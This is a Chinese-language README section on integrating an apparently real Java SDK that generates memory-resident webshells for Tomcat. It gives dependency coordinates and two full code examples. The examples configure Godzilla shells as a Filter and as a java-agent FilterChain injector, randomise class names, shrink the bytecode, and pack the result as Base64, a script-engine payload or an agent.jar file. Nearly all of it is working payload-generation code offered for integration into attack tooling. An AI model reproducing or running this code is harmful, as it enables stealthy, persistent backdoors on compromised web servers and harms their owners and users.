## SDK 集成

> 适合集成到已有工具中，实现内存马 payload 的生成，支持 JDK8 以上版本，v1.7.0 开始支持

1. 添加依赖，Maven Or Gradle

```xml
<!-- Maven Repo-->
<dependency>
    <groupId>io.github.reajason</groupId>
    <artifactId>generator</artifactId>
    <version>1.10.0</version>
</dependency>
```

```groovy
// Gradle Repo
implementation 'io.github.reajason:generator:1.10.0'
```

2. 生成 Tomcat Godzilla Filter 内存马示例

```java
ShellConfig shellConfig = ShellConfig.builder()
        .server(Server.Tomcat)
        .shellTool(ShellTool.Godzilla)
        .shellType(ShellType.FILTER)
        .shrink(true) // 缩小字节码
        .debug(false) // 关闭调试
        .build();

InjectorConfig injectorConfig = InjectorConfig.builder()
//                .urlPattern("/*")  // 自定义 urlPattern，默认就是 /*
//                .shellClassName("com.example.memshell.GodzillaShell") // 自定义内存马类名，默认为空时随机生成
//                .injectorClassName("com.example.memshell.GodzillaInjector") // 自定义注入器类名，默认为空时随机生成
        .build();

GodzillaConfig godzillaConfig = GodzillaConfig.builder()
//                .pass("pass")
//                .key("key")
//                .headerName("User-Agent")
//                .headerValue("test")
        .build();

GenerateResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);

System.out.println("注入器类名："+result.getInjectorClassName());
System.out.println("内存马类名："+result.getShellClassName());

System.out.println(result.getShellConfig());
System.out.println(result.getShellToolConfig());

System.out.println("Base64 打包："+Packers.Base64.getInstance().pack(result));
System.out.println("脚本引擎打包："+Packers.ScriptEngine.getInstance().pack(result));
```
3. 生成 Tomcat Godzilla AgentFilterChain 示例
```java
ShellConfig shellConfig = ShellConfig.builder()
        .server(Server.Tomcat)
        .shellTool(ShellTool.Godzilla)
        .shellType(ShellType.AGENT_FILTER_CHAIN)
        .shrink(true) // 缩小字节码
        .debug(false) // 关闭调试
        .build();

InjectorConfig injectorConfig = InjectorConfig.builder()
//                .urlPattern("/*")  // 自定义 urlPattern，默认就是 /*
//                .shellClassName("com.example.memshell.GodzillaShell") // 自定义内存马类名，默认为空时随机生成
//                .injectorClassName("com.example.memshell.GodzillaInjector") // 自定义注入器类名，默认为空时随机生成
        .build();

GodzillaConfig godzillaConfig = GodzillaConfig.builder()
//                .pass("pass")
//                .key("key")
//                .headerName("User-Agent")
//                .headerValue("test")
        .build();

GenerateResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);

System.out.println("注入器类名：" + result.getInjectorClassName());
System.out.println("内存马类名：" + result.getShellClassName());

System.out.println(result.getShellConfig());
System.out.println(result.getShellToolConfig());

byte[] agentJarBytes = ((JarPacker) Packers.AgentJar.getInstance()).packBytes(result);
Files.write(Paths.get("agent.jar"), agentJarBytes);
```
4. 封装统一生成接口可参考 [GeneratorController.java](boot/src/main/java/com/reajason/javaweb/boot/controller/GeneratorController.java)
